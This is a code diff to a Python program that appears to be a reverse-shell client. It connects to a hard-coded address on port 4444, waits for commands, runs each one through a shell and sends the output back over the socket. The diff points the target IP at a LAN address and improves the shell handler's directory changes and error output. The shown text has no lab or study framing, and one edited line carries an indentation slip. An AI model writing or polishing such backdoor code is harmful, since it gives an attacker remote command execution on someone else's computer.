@@ -9,7 +9,7 @@ import subprocess
 import os
 
 
-IP = "127.0.0.1"
+IP = "192.168.0.53"
 PORT = 4444
 ARC = platform.system()
 
@@ -57,36 +57,35 @@ def kill_connection(sock):
         sys.exit()
 
 def handle_shell(sock):
-    curr_dir = os.getcwd() # not necessary
-
-    while True:
+     while True:
         cmd = recv(sock).decode()
         if cmd == "exit_shell":
             break
         try:
-            if cmd.startswith("cd "):
-                dir = cmd[3:]
-                if not os.path.isdir(dir):
-                    send(sock, f"$ No such directory {dir}\n".encode())
-                    send(sock, b"END_OF_OUTPUT")
+            if cmd.startswith("cd"):
+                dir = cmd[3:].strip()
+                if not dir:
+                    send(sock, f"$ {os.getcwd()}\nEND_OF_OUTPUT".encode())
                     continue
-                os.chdir(dir)
-                send(sock, f"$ {str(os.getcwd())}\n".encode())
-                send(sock, b"END_OF_OUTPUT")
+                try:
+                    os.chdir(dir)
+                    send(sock, f"$ {os.getcwd()}\nEND_OF_OUTPUT".encode())
+                except FileNotFoundError:
+                    send(sock, f"cd: No such directory\nEND_OF_OUTPUT".encode())
                 continue
             else:
                 proc = subprocess.Popen(
                     cmd,
                     shell=True,
                     stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
                     stdin=subprocess.PIPE
                 )
                 for line in proc.stdout:
                     send(sock, line)
                 send(sock, b"END_OF_OUTPUT")      
         except Exception as e:
-            send(sock, f"Error: {str(e)}".encode())
+            send(sock, f"Error: {str(e)}\n".encode())
             send(sock, b"END_OF_OUTPUT")
 
 def handle_cmd(sock):
